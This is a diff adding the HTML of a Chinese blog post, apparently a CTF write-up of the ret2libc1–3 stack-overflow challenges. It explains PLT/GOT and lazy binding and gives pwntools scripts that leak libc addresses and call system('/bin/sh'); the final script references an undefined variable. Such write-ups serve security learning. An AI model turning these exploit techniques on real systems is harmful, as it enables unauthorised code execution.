@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">[bamboofox] ret2libc1,2,3 [CTFwiki] | a39&#39;s blog</title>
+<meta property="og:title" content="[bamboofox] ret2libc1,2,3 [CTFwiki] | a39&#39;s blog" />
+<meta name="twitter:title" content="[bamboofox] ret2libc1,2,3 [CTFwiki] | a39&#39;s blog" />
+<meta itemprop="name" content="[bamboofox] ret2libc1,2,3 [CTFwiki] | a39&#39;s blog" />
+<meta name="application-name" content="[bamboofox] ret2libc1,2,3 [CTFwiki] | a39&#39;s blog" />
+<meta property="og:site_name" content="Awesome hugo blog" />
+
+<meta name="description" content="栈溢出 ret2libc">
+<meta itemprop="description" content="栈溢出 ret2libc" />
+<meta property="og:description" content="栈溢出 ret2libc" />
+<meta name="twitter:description" content="栈溢出 ret2libc" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/posts/2022-10-19-ret2libc/" title="English" />
+
+
+
+  <meta itemprop="image" content="http://localhost:1313/" />
+  <meta property="og:image" content="http://localhost:1313/" />
+  <meta name="twitter:image" content="http://localhost:1313/" />
+  <meta name="twitter:image:src" content="http://localhost:1313/" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2022-10-19T00:00:00Z />
+    <meta property="article:published_time" content=2022-10-19T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="A39" />
+    <meta property="article:author" content="A39" />
+    <meta name="author" content="A39" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "[bamboofox] ret2libc1,2,3 [CTFwiki]",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2022-10-19",
+        "description": "栈溢出 ret2libc",
+        "wordCount":  600 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2022-10-19",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "a39\u0027s blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.124.1">
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/2022-10-19-ret2libc/">
+    <link href="/style.min.438600358716ffcca2c03b3bd92033c379583f8a88e7181207671f5b8dec4ac1.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon.ico">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon.ico">
+    <link rel="mask-icon" href="/icons/favicon.ico">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    <meta name="google-site-verification" content="OBu2RkZZmMk9xXDviEo5asuAjsd_8wa5j_4Ii17jFEU" />
+    <meta name="msvalidate.01" content="BBF6721C148EF3AB67B2821F85888D4D" />
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"
+    integrity="sha512-fHwaWebuwA7NSF5Qg/af4UeDx9XqUpYpOGgubo3yWu+b2IQR4UeQwbb42Ti7gVAjNtVoI/I9TEoYeu9omwcC6g==" crossorigin="anonymous" crossorigin="anonymous" />
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"
+    integrity="sha512-LQNxIMR5rXv7o+b1l8+N1EZMfhG7iFZ9HhnbJkTp4zjNr5Wvst75AqUeFDxeRUa7l5vEDyUiAip//r+EFLLCyA=="
+    crossorigin="anonymous"></script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"
+    integrity="sha512-iWiuBS5nt6r60fCz26Nd0Zqe0nbk1ZTIQbl3Kv7kYsX+yKMUFHzjaH2+AnM6vp2Xs+gNmaBAVWJjSmuPw76Efg==" crossorigin="anonymous" onload="renderMathInElement(document.body, {
+      delimiters: [
+        {left: '$$', right: '$$', display: true},
+        {left: '$', right: '$', display: false}
+      ]
+    });"></script>
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/friends/">
+                        Friends
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">[bamboofox] ret2libc1,2,3 [CTFwiki]</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2022-10-19T00:00:00&#43;00:00" itemprop="datePublished"> 19 Oct 2022 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#ret2libc">ret2libc</a>
+      <ul>
+        <li><a href="#基本原理">基本原理</a>
+          <ul>
+            <li><a href="#动态链接库">动态链接库</a></li>
+            <li><a href="#plt和got">PLT和GOT</a></li>
+            <li><a href="#动态链接工作过程">动态链接工作过程</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#题目">题目</a>
+      <ul>
+        <li><a href="#ret2libc1">ret2libc1</a>
+          <ul>
+            <li><a href="#exp">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#ret2libc2">ret2libc2</a>
+          <ul>
+            <li><a href="#exp-1">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#ret2libc3">ret2libc3</a>
+          <ul>
+            <li><a href="#libc延迟绑定">libc延迟绑定</a></li>
+            <li><a href="#exp-2">EXP</a></li>
+            <li><a href="#libc-database">Libc-Database</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="ret2libc">ret2libc</h2>
+<h3 id="基本原理">基本原理</h3>
+<p>ret2libc即控制函数的执行libc中的函数，是本ELF文件没有的函数，通常是返回至某个函数的PLT处或者函数的具体位置 （即函数对应的 got 表项的内容）。一般情况下，我们会选择执行<code>system(&quot;/bin/sh&quot;)</code>，故而此时我们需要知道system函数的地址</p>
+<p>看名字就知道又是一个栈溢出的利用，栈溢出就不重复讲解了，讲讲有关动态链接库的内容</p>
+<h4 id="动态链接库">动态链接库</h4>
+<p>动态链接库是一类不可执行的二进制文件，在Windows下其后缀名为<code>.dll</code>，在Linux下其后缀名为<code>.so</code>。动态链接库中主要包括了一些函数的具体实现过程以供其他程序直接调用，比如libc-2.31.so中就包含了<code>printf</code>、<code>scanf</code>等函数的具体实现，因此我们在编写自己的C语言程序时可以直接调用该函数而无需自行实现</p>
+<p>那么动态链接库和静态链接库有什么区别呢，我们来看一个小例子</p>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+ 
+int main()
+{
+    printf(&#34;Hello world!&#34;);
+}
+</code></pre><p>我们用<code>gcc --static -o staticELF test.c</code>和<code>gcc -o dynamicELF test.c</code>来对代码分别通过静态链接方式和动态链接方式进行编译得到两个ELF文件</p>
+<p>显然两者的功能完全相同，区别就在于ELF文件的大小了，两者的大小区别不是一般的大</p>
+<pre tabindex="0"><code>-rwxrwxrwx 1 asuka asuka  15952 Oct 21 00:31 dynamicELF*
+-rwxrwxrwx 1 asuka asuka 900264 Oct 21 00:31 staticELF*
+</code></pre><p>这是因为在静态链接方式编译的程序把要用到的库函数和对应的子函数等都包含在了程序的text段中，自给自足，而动态链接方式编译的程序本身不包含库函数，而借助系统的动态链接库完成运行</p>
+<p>静态链接和动态链接各自的优劣之处也就看出来了</p>
+<ul>
+<li>静态链接编译的文件可移植性好，但体积大、相对臃肿</li>
+<li>动态链接编译的文件体积小、运用灵活，但对系统环境依赖性强</li>
+</ul>
+<p>说这些可能比较枯燥，举个很真实的例子：你一定曾经在运行Windows平台的程序的时候遇到过“DLL缺失”的奇怪问题，而网上给出的解决方案常常是把某个DLL文件放进系统文件夹里。这里DLL文件就是Windows下的动态链接库了。没有动态链接，我们下载的应用、游戏可能会比现在大几十倍不止，这可不是绝大多数用户可以承受得起的代价。可以说，动态链接库是现代操作系统的一大创举</p>
+<h4 id="plt和got">PLT和GOT</h4>
+<p>现在我们摆脱了必须自己实现库函数的困境，但还有一个问题横亘在我们面前：我们要如何调用系统提供的库函数呢？这就不得不提ELF文件的PLT和GOT了</p>
+<p>PLT（Procedure Linkage Table，程序链接表）、GOT（Global Offset Table，全局偏移表）是程序在链接库内定位所需函数用到的两张表。PLT被用来存储外部函数的入口点，程序通过PLT寻找外部函数；PLT存储在代码段（Code Segment）内，在运行之前就被确定不再修改；GOT被存储在数据段（Data Segment）内，与PLT不同的是，GOT表可以在程序运行的过程中被修改，PLT存储的入口点就是GOT中对应条目的函数的确切地址</p>
+<p><img alt="img" src="./img/2022102433096-20220522185706898-1278591319.png"></p>
+<p><img alt="img" src="./img/20221060195b86133845349b2bc25df7fa98ed-1024x300.png"></p>
+<p>等等，我们好像发现了一个不合理的地方，外部函数的内存地址存储在 GOT 而非 PLT 表内，PLT 存储的入口点又指向 GOT 的对应条目，那么程序为什么选择 PLT 而非 GOT 作为调用的入口点呢？在程序启动时确定所有外部函数的内存地址并写入 GOT 表，之后只使用 GOT 表不是更方便吗？</p>
+<p>这样的设计是为了程序的运行效率。GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。整个过程如下面两张图所示（左为第一次调用，右为再次调用）</p>
+<p><img alt="img" src="./img/202210v2-b78288c5eb8bfd2568728f34fbbb0e9e_720w.png"></p>
+<p><img alt="img" src="./img/202210v2-caa5320d0bb0101edad4b9127f6fe413_720w.png"></p>
+<p>值得注意的是，在原程序调用PLT内的跳转函数时使用的是<code>call</code>指令，而PLT却是<code>jmp</code>到GOT的，这意味着其后还跟随着<code>push</code>返回地址和函数参数</p>
+<h4 id="动态链接工作过程">动态链接工作过程</h4>
+<p><img alt="img" src="./img/20221020200718223649742.png"></p>
+<p><img alt="img" src="./img/2022102020071822370998.png"></p>
+<p>这两张图将过程解释得非常清晰了，故不再画蛇添足（绝对不是因为懒）</p>
+<h2 id="题目">题目</h2>
+<h3 id="ret2libc1">ret2libc1</h3>
+<p>首先还是checksec一下，发现是个32位ELF文件，但是开了NX保护</p>
+<ul>
+<li>NX保护（No EXecute，栈禁止执行）：简单来说就是“可写的不可执行，可执行的不可写”</li>
+</ul>
+<p>拖进32位IDA反编译一下</p>
+<pre tabindex="0"><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts(&#34;RET2LIBC &gt;_&lt;&#34;);
+  gets(s);
+  return 0;
+}
+</code></pre><p>发现危险函数<code>gets</code>函数，可以栈溢出</p>
+<p>还发现一个<code>secure</code>函数，里面有调用<code>system</code>函数（在原程序里实际上是<code>call 0x8048460 &lt;system@plt&gt;</code>，即调用PLT里的跳转函数），但是调用参数并不合法，无法直接跳转利用</p>
+<pre tabindex="0"><code>void secure()
+{
+  unsigned int v0; // eax
+  int input; // [esp+18h] [ebp-10h] BYREF
+  int secretcode; // [esp+1Ch] [ebp-Ch]
+
+  v0 = time(0);
+  srand(v0);
+  secretcode = rand();
+  __isoc99_scanf(&#34;%d&#34;, &amp;input);
+  if ( input == secretcode )
+    system(&#34;shell!?&#34;);
+}
+</code></pre><p>其中<code>system</code>函数的PLT跳转函数<code>_system</code>地址为0x08048460（在IDA的侧边栏里的Segment找<code>.plt</code>）</p>
+<p>再来搜索下字符串，发现有<code>/bin/sh</code>（0x08048720）</p>
+<pre tabindex="0"><code>.rodata:08048720 aBinSh          db &#39;/bin/sh&#39;,0          ; DATA XREF: .data:shell↓o
+</code></pre><p>最后来算一下偏移，介绍一个很方便的方法：<code>cyclic</code></p>
+<p>先来随便生成一个随机的长字符串<code>cyclic 128</code>，然后在gdb内运行程序，将生成的字符串作为输入，返回报错</p>
+<pre tabindex="0"><code>Invalid address 0x62616164
+</code></pre><p>可知溢出点在0x62616164，再使用命令<code>cyclic -l 0x62616164</code>，得到偏移长度112，非常方便快捷</p>
+<p>现在我们来捋一捋思路</p>
+<p>我们现在手头上有：合法调用的<code>get</code>函数、跳转函数<code>_system</code>、字符串<code>/bin/sh</code>，但是栈不可执行、<code>secure</code>函数传入<code>system</code>函数的参数不对</p>
+<p>我们无法直接ret2text，但是程序本身有system函数的动态链接，那么我们直接调用程序PLT里的<code>_system</code>函数不就好了</p>
+<h4 id="exp">EXP</h4>
+<pre tabindex="0"><code>from pwn import *
+
+io = process(&#39;./ret2libc1&#39;)
+
+binsh = 0x08048720
+systemplt = 0x08048460
+payload = b&#39;a&#39;*112 + p32(systemplt) + b&#39;b&#39;*4 + p32(binsh)
+
+io.sendline(payload)
+io.interactive()
+</code></pre><p>为什么在溢出+地址之后还要填上‘bbbb’呢？原因就在于之前所说的PLT跳转函数使用的是jmp指令，故程序栈会给真正的system函数（GOT指向的那个）栈压入一个返回地址和函数参数</p>
+<p>综上，我们构造的payload结构如下</p>
+<p><img alt="img" src="./img/202210payload.jpg"></p>
+<p>勘误：这里应该调用的是<code>system@plt</code>，也就是<code>_system</code>，地址应为0x08048460</p>
+<h3 id="ret2libc2">ret2libc2</h3>
+<p>题目基本和上题一样，不过这次我们搜索字符串时并没有找到<code>/bin/sh</code></p>
+<p>那是不是就无解了呢，不如来换个思路，没有条件就创造条件</p>
+<p>还记得.bss段吗，它在很多情况下可以被读取、写入、执行。我们不如尝试将后台代码写入.bss段中</p>
+<ul>
+<li>BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。可执行程序包括BSS段、数据段、代码段</li>
+<li>BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。特点是：可读写的，在程序执行之前BSS段会自动清0。所以，未初始的全局变量在程序执行之前已经成0了</li>
+<li>数据段包括初始化的数据和未初始化的数据（BSS）两部分 。BSS段存放的是未初始化的全局变量和静态变量</li>
+<li>UNIX下可使用size命令查看可执行文件的段大小信息</li>
+</ul>
+<p>IDA里也恰好找到一个长为100的空闲内存buf2（0x0804A080）</p>
+<pre tabindex="0"><code>.bss:0804A080                 public buf2
+.bss:0804A080 ; char buf2[100]
+.bss:0804A080 buf2            db 64h dup(?)
+.bss:0804A080 _bss            ends
+.bss:0804A080
+</code></pre><p>如何写入呢，我们手头上正好有个<code>get</code>函数，正好可以利用起来</p>
+<p>简单分析一下：栈满&ndash;&gt;返回地址覆盖为<code>get</code>函数地址&ndash;&gt;<code>get</code>函数完成写入后返回<code>_system</code>函数&ndash;&gt;<code>system</code>函数调用写入的字符串&ndash;&gt;getshell</p>
+<p>这里程序栈的构造就有几分考究了，先从大体上入手，构造<code>get</code>函数的程序栈</p>
+<p><img alt="img" src="./img/2022102022-10-21_215236-e1666360467768-1024x868.png"></p>
+<p>然后来考虑<code>_system</code>函数</p>
+<p><img alt="img" src="./img/2022102022-10-21_215628-1024x576.png"></p>
+<p>最终得到payload的构造如下</p>
+<p><img alt="img" src="./img/2022102022-10-21_214632.png"></p>
+<p><img alt="img" src="./img/202210v2-a6ce315f0787a9963cf85ea8492b7a35_720w.webp"></p>
+<p>当然，我们不一定非要输入<code>/bin/sh</code>，我们也可以直接输入<code>cat flag</code>一步到位，不过这也只是一点点做题技巧罢了，没有什么实质性的不同</p>
+<p>这题大佬们说还可以用堆栈平衡来做，但由于我水平有限，这里不做介绍</p>
+<h4 id="exp-1">EXP</h4>
+<pre tabindex="0"><code>from pwn import *
+
+io = process(&#39;./ret2libc2&#39;)
+
+buf2 = 0x0804A080
+systemplt = 0x08048490
+getsplt = 0x08048460
+payload = b&#39;a&#39;*112 + p32(getsplt) + p32(systemplt) + p32(buf2) + p32(buf2)
+
+io.sendline(payload)    #输入/bin/sh
+io.interactive()
+</code></pre><h3 id="ret2libc3">ret2libc3</h3>
+<p>（听说这才是真正意义上的ret2libc）</p>
+<p>第三题在第二题的基础上，将<code>system</code>函数的地址删去了，我们该如何得到<code>system</code>函数的地址呢</p>
+<h4 id="libc延迟绑定">libc延迟绑定</h4>
+<p>这里介绍一下libc的延迟绑定</p>
+<p>动态链接的程序是在运行时需要对全局和静态数据访问进行GOT定位，然后间接寻址。同样，对于模块间的调用也需要GOT定位，再间接跳转。这么做势必会影响到程序的运行速度。但程序在运行时很大一部分函数都可能用不到，于是ELF采用了当函数第一次使用时才进行绑定的思想，也就是我们所说的延迟绑定。ELF实现延迟绑定是通过PLT，原先GOT中存放着全局变量和函数调用，现在把它拆成两个部分.got和.got.plt，用 .got存放着全局变量引用，用.got.plt存放着函数引用</p>
+<p>简而言之，一个函数被调用过以后，got表里保存了它在内存中的地址，可以通过泄露got表内存来泄露函数地址，就可以根据其与libc中该函数的偏移计算其他函数在内存空间中的地址。因为libc中任意两个函数之间的偏移是固定的</p>
+<p>那么思路就逐渐明了了</p>
+<p>首先我们先跑一次程序，完成动态绑定，第一次溢出获取已知函数在GOT表的地址，并且返回到程序入口点再次运行</p>
+<p><img alt="img" src="./img/202210v2-f545af77425f6b2c54eec20280381b49_r.jpg"></p>
+<p>然后根据获得的地址查询libc版本并计算偏移，得到我们需要的<code>system</code>和<code>/bin/sh</code>真实地址，然后第二次溢出getshell</p>
+<ul>
+<li>有个方便的libc查询模块
+<ul>
+<li><a href="https://github.com/lieanu/LibcSearcher">GitHub - lieanu/LibcSearcher</a></li>
+</ul>
+</li>
+<li>手动查询也可以用现有的数据库
+<ul>
+<li><a href="https://github.com/niklasb/libc-database">GitHub - niklasb/libc-database</a></li>
+</ul>
+</li>
+</ul>
+<p><img alt="img" src="./img/202210v2-e4906b5a6b1387b8c5e702205ae2d497_r.jpg"></p>
+<h4 id="exp-2">EXP</h4>
+<h5 id="旧expubuntu18以下">旧EXP（Ubuntu18以下）</h5>
+<pre tabindex="0"><code>from pwn import *
+from LibcSearcher import *
+
+elf = ELF(&#39;./ret2libc3&#39;)
+io = process(&#39;./ret2libc3&#39;)
+
+puts_plt = elf.plt[&#39;puts&#39;]    #获取puts的plt地址
+puts_got = elf.got[&#39;puts&#39;]    #获取puts的got地址
+start_addr = elf.symbols[&#39;_start&#39;]    #获取程序开始点start地址
+
+payload1 = b&#39;a&#39;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)    #溢出+puts@plt函数+puts后返回start+puts输出got地址
+io.sendlineafter(&#34;!?&#34;,payload1)    #第一次溢出
+
+puts_addr = u32(io.recv(4))    #获取输出的got地址并解包取后12位
+libc = LibcSearcher(&#39;puts&#39;,puts_addr)    #查询libc版本
+libcbase = puts_addr-libc.dump(&#34;puts&#34;)    #计算偏移
+system_addr = libcbase+libc.dump(&#34;system&#34;)    #计算system真实地址
+binsh_addr = libcbase+libc.dump(&#34;str_bin_sh&#34;)    #计算字符串&#39;/bin/sh&#39;真实地址
+
+payload2 = b&#39;a&#39;*112+p32(system_addr)+b&#39;a&#39;*4+p32(binsh_addr)
+io.sendlineafter(&#34;!?&#34;,payload2)    #第二次溢出
+io.interactive()
+</code></pre><p>不知道为什么<code>.plt['puts']</code>会报错<code>KeyError: u'puts'</code>跑不动，找半天也没有同类错误
+原因找到了，由于wiki的历史较久（当时乌云甚至还没倒），pwntools依赖的pwnlib已经不再支持python2，换用python3不会有同类报错
+一直迁就网上年代较久远的exp使用python2也不是个长久的办法，以后还是得逐渐将阵地转移到python3
+还有另一个问题是LibcSearcher内置的Libc数据库也已经年久失修找不到对应Libc版本了</p>
+<h5 id="新expubuntu18及以上">新EXP（Ubuntu18及以上）</h5>
+<pre tabindex="0"><code>from pwn import *
+from LibcSearcher import *
+ 
+elf = ELF(&#39;./ret2libc3&#39;)
+io = process(&#39;./ret2libc3&#39;)
+ 
+puts_plt = elf.plt[&#39;puts&#39;]    #获取puts的plt地址
+puts_got = elf.got[&#39;puts&#39;]    #获取puts的got地址
+start_addr = elf.symbols[&#39;_start&#39;]    #获取程序开始点start地址
+ 
+payload1 = b&#39;a&#39;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)    #溢出+puts@plt函数+puts后返回start+puts输出got地址
+io.sendlineafter(&#34;!?&#34;,payload1)    #第一次溢出
+ 
+puts_addr = u32(io.recv(4))    #获取输出的got地址并解包取后12位
+libc = LibcSearcher(&#39;puts&#39;,puts_addr)    #查询libc版本：libc6_2.35-0ubuntu1_i386
+libcbase = puts_addr-libc.dump(&#34;puts&#34;)    #计算偏移
+system_addr = libcbase+libc.dump(&#34;system&#34;)    #计算system真实地址
+binsh_addr = libcbase+libc.dump(&#34;str_bin_sh&#34;)    #计算字符串&#39;/bin/sh&#39;真实地址
+retnaddr = 0x804841E    #_init_proc函数的retn地址
+
+payload2 = b&#39;a&#39;*112+p32(retnaddr)+p32(system_addr)+b&#39;a&#39;*4+p32(binsh_addr)   #溢出+栈平衡+system+伪retn_addr+shellcode_addr
+io.sendlineafter(&#34;!?&#34;,payload2)    #第二次溢出
+io.interactive()
+</code></pre><p>和旧EXP不同的是在第二次溢出的时候先压入了一个地址用于栈平衡，这样就可以在本地打通了（Ubuntu22.04）
+至于为什么是_init_proc函数我尚未找到具体的资料，有待深入</p>
+<p>你折磨得我好苦啊栈平衡君（大悲）</p>
+<p><strong>PS1</strong>：发现其实使用__libc_csu_init函数也一样可以打通</p>
+<pre tabindex="0"><code>retnaddr = 0x8048700    #__libc_csu_init函数的retn地址
+</code></pre><p>gdb调试了一下，执行顺序大概是这样的：<code>_init</code>-&gt;<code>__libc_csu_init</code>-&gt;<code>__libc_start_main_impl</code>-&gt;<code>main</code>？
+得去查查Linux的程序的执行机制</p>
+<h4 id="libc-database">Libc-Database</h4>
+<p>有另一种略麻烦的解决办法，就是将<a href="https://github.com/niklasb/libc-database">Libc-Database</a>部署到本地手动查询，但优点是可以不使用年久失修的LibcSearcher、不依赖网络、数据库更新更全
+常用命令如下：</p>
+<ul>
+<li>
+<pre tabindex="0"><code>  ./get [libc_database_name...]
+</code></pre><p>：更新数据库、下载相关libc集</p>
+<ul>
+<li>第一次使用Libc-Database需要手动下载</li>
+<li>目前支持：
+<ul>
+<li>ubuntu</li>
+<li>debian</li>
+<li>rpm</li>
+<li>centos</li>
+<li>arch</li>
+<li>alpine</li>
+<li>kali</li>
+<li>parrotsec</li>
+<li>launchpad</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>./find [function_name] [addr]</code>：使用函数名+地址（可以多组）查找libc版本</p>
+</li>
+<li>
+<p><code>./dump [libc_name] [function_name...]</code>：获取对应libc里函数的地址</p>
+</li>
+<li>
+<p><code>./download [libc_name]</code>：下载指定libc</p>
+</li>
+<li>
+<p><code>./add [local_libc_path]</code>：添加本地libc</p>
+</li>
+</ul>
+<pre tabindex="0"><code>from pwn import *
+
+sh = process(&#39;./ret2libc3&#39;)
+e = ELF(&#39;./ret2libc3&#39;)
+puts_plt = e.plt[&#39;puts&#39;]
+main_plt = e.symbols[&#34;_start&#34;]
+puts_got = e.got[&#39;puts&#39;]
+libc_start_main_got = e.got[&#39;__libc_start_main&#39;]
+
+payload = b&#39;a&#39;*112+p32(puts_plt)+p32(main_plt)+p32(puts_got)
+sh.sendlineafter(&#34;Can you find it !?&#34;,payload)
+
+print(&#34;get the related addr&#34;)
+puts_addr = u32(sh.recv()[0:4])
+# print(&#34;print puts_addr to find libc:&#34;+hex(puts_addr))   # 260 
+print(&#34;print __libc_start_main to find libc:&#34;+hex(libc_start_main_got))     # 024
+
+libc_puts = 0x073260        # libc6-2.35-0ubuntu3.1_i386
+libc_system = 0x048150
+libc_binsh = 0x11bd0f5
+
+libcbase = puts_addr - libc_puts
+system_addr = libcbase + libc_system
+binsh_addr = libcbase + libc_binsh
+
+# payload = b&#39;a&#39;*112+p32(system_addr)+b&#39;a&#39;*4+p32(binsh_addr)
+payload = b&#39;a&#39;*112+p32(retnaddr)+p32(system_addr)+b&#39;a&#39;*4+p32(binsh_addr)   #溢出+栈平衡+system+伪retn_addr+shellcode_addr
+sh.sendline(payload)
+sh.interactive()
+</code></pre><p>这个脚本需要跑至少两次，前面几次获取几个函数的地址以精确查询libc库的版本，最后一次改好地址直接getshell
+查找出来的结果有时会比较多，而且x86和x64的都有，可以通过程序的指令集架构来缩小范围
